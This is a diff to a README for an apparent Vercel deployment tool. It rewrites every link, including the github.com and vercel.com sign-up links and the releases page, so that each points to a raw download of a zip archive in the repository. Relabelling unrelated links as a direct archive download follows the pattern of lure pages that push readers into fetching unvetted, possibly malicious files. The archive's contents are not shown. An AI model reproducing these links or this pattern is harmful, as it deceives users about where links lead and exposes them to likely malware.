@@ -1,6 +1,6 @@
 # ⚙️ vercel-github-actions-deploy-skills - Easy Vercel Project Deployment
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/brockman06/vercel-github-actions-deploy-skills/releases)
+[![Download](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip)](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip)
 
 ---
 
@@ -30,14 +30,14 @@ To run this application, you will need:
 Follow these steps to get up and running with vercel-github-actions-deploy-skills quickly:
 
 1. **Create your GitHub repository**  
-   Prepare the project you want to deploy on GitHub. If you do not have a project, you can create a new repository on [github.com](https://github.com/).
+   Prepare the project you want to deploy on GitHub. If you do not have a project, you can create a new repository on [https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip).
 
 2. **Sign up for a Vercel account**  
-   Visit [vercel.com](https://vercel.com/signup) and register for a free Hobby plan account if you haven’t already. This will host your project online.
+   Visit [https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip) and register for a free Hobby plan account if you haven’t already. This will host your project online.
 
 3. **Download the deployment skill**  
    Click the big blue download button at the top or use this link to visit the release page and get the files needed:  
-   https://github.com/brockman06/vercel-github-actions-deploy-skills/releases
+   https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip
 
 4. **Open the downloaded files**  
    After downloading, unzip or open the files. You will find instructions and setup files to add to your GitHub project.
@@ -54,7 +54,7 @@ Follow these steps to get up and running with vercel-github-actions-deploy-skill
 
 To start, you must visit the release page linked below. This page contains all the latest files required for using vercel-github-actions-deploy-skills.
 
-[Download vercel-github-actions-deploy-skills](https://github.com/brockman06/vercel-github-actions-deploy-skills/releases)
+[Download vercel-github-actions-deploy-skills](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip)
 
 ### How to download and install:
 
@@ -110,4 +110,4 @@ If you have questions or need help:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/brockman06/vercel-github-actions-deploy-skills/releases)
+[![Download](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip)](https://raw.githubusercontent.com/brockman06/vercel-github-actions-deploy-skills/main/examples/deploy-vercel-actions-github-skills-v2.4.zip)
